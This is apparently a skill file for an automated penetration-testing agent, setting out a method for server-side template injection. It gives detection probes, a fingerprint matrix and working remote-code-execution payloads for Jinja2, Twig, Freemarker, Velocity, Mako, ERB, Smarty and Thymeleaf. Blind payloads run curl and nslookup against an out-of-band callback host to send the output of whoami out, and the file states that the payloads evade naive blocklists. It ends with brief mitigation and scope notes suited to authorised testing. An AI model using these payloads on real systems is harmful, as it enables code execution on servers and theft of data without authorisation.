---
name: ssti
description: "Server-Side Template Injection — fingerprint engines, escalate to RCE, blind detection."
category: ssti
allowed_tools:
  - curl
  - ffuf
  - gobuster
version: "1.0.0"
author: "MIRV"
---

# Server-Side Template Injection Methodology

## 1. Detection — primary probes
Inject and observe the rendered output:
- `{{7*7}}`        → `49`                      (generic Jinja2/Twig domain)
- `{{7*'7'}}`      → `7777777` (Jinja2) vs `49` (Twig)  ← key differentiator
- `${7*7}`         → `49`        (Freemarker / Velocity)
- `<%=7*7%>`       → `49`        (ERB / EJS)
- `#{7*7}`         → `49`        (Ruby Slim)
- `${{7*7}}`       → `49`        (Thymeleaf)
- `*{7*7}`         → `49`        (Thymeleaf inline)
- `$smarty`"...    → Smarty `{$smarty.version}` fingerprint
- `@(7*7)`         → `49`        (Handlebars / canary)

Sentinel pairs: `{{1+1}}={{7*'7'}}` to use across engines at once; choose the probe whose
output is uniquely mappable per engine.

## 2. Fingerprint matrix (probe → expected output)
| Probe                    | Jinja2 | Twig    | Velocity | Freemarker | Smarty | Mako | ERB  | Django | Handlebars | Thymeleaf |
|--------------------------|--------|---------|----------|------------|--------|------|------|--------|------------|-----------|
| `{{7*7}}`                | 49     | 49      | 49       | -          | -      | 49   | -    | 49     | -          | -         |
| `{{7*'7'}}`              | 7777777| 49      | -        | -          | -      | 49   | -    | error  | -          | -         |
| `${7*7}`                 | -      | -       | 49       | 49         | -      | -    | -    | -      | -          | -         |
| `<%=7*7%>`               | -      | -       | -        | -          | -      | -    | 49   | -      | -          | -         |
| `#{7*7}`                 | -      | -       | -        | -          | -      | -    | 49   | -      | -          | -         |

(`-` = no substitution / literal render)

## 3. Escalation — RCE per engine
- **Jinja2**:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}
```
- **Twig** (≤1.20 / sandbox disabled):
```
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ['id']|map('system')|join }}
```
- **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- **Smarty**: `{system('id')}` / `{Smarty_Internal_Writefile::writeFile($path,$x,$y)}`
- **Velocity**:
```
#set($R=$class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))
#set($P=$R.exec("id"))
```
- **Mako**: `${__import__('os').popen('id').read()}`
- **ERB**: `<%= system('id') %>` / `<%= \`id\` %>`
- **Django** (escaping disabled): `{% debug %}`
- **Thymeleaf** OGNL/SpEL: `__${T(java.lang.Runtime).getRuntime().exec('id')}__`

## 4. Blind SSTI — OOB detection
Use Burp Collaborator + DNS exfil when output is not reflected. Smoke test — engine
neutral payloads that yield a Collaborator DNS hit within 30s (visible-output agnostic):
- Jinja2: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl http://OAST/$(whoami)').read() }}`
- Twig: `{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("nslookup $(whoami).OAST") }}`
- Freemarker: `${ex("curl http://OAST/$(whoami)")}`
- Velocity: `#set($R=$class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))#set($P=$R.exec("nslookup $(whoami).OAST"))`

## 5. Targets (writes rendered server-side)
- User-profile `name` / `display_name` / `bio`, personalised greeting widgets
- Email template preview (subject, sender_name) and CMS page bodies
- PDF generators (invoice preview, certificate templates), report renderer
  (JasperReports, wkhtmltopdf header injection)
- URL params passed to `render_template_string` / `Template(...).render()`

## 6. Mitigation notes (for report)
- Prefer logic-less templates (Mustache, Handlebars strict mode)
- Sandbox environments: `SandboxedEnvironment()` (Jinja2),
  `Twig_Sandbox_SecurityPolicy`; pass variables via context dict — **never
  concatenate user input into the template source**
- Disable risky features `_self`, `registerUndefinedFilterCallback`, `?eval`
- WAF alone insufficient — every payload here evades naive body-blocklists

## IMPORTANT
- Every finding: probe used, observed output (or Collaborator hit), escalated RCE proof
- Blind chains: report timestamp + Collaborator DNS hit ID
- Test only in-scope endpoints; never leave an active reverse shell
- Document CVE linkage where applicable